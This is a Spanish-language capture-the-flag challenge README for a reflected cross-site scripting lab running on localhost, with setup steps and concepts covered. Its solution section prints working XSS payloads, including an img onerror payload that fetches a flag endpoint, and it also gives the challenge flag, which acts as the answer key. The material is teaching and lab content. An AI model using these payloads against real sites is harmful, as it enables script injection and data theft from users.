# XSS Reflejado (WEB - Medio)

## Descripción
La aplicación no sanitiza la entrada del usuario. Puedes inyectar JavaScript que se ejecutará en el navegador.

## Instrucciones
1. Inicia el servidor: `python app.py`
2. Accede a `http://localhost:3000/`
3. Inyecta código JavaScript en el parámetro `q`

## Solución
Payload XSS:
```
<script>alert('CTF{xss_reflected}')</script>
```

URL:
```
http://localhost:3000/search?q=<script>alert('XSS Works!')</script>
```

Payload alternativo para exfiltrar datos:
```
<img src=x onerror="fetch('/api/flag').then(r=>r.text()).then(t=>alert(t))">
```

## Flag
```
CTF{xss_reflected}
```

## Conceptos
- Cross-Site Scripting (XSS)
- XSS Reflejado
- Inyección de JavaScript
- Exfiltración de datos via XSS
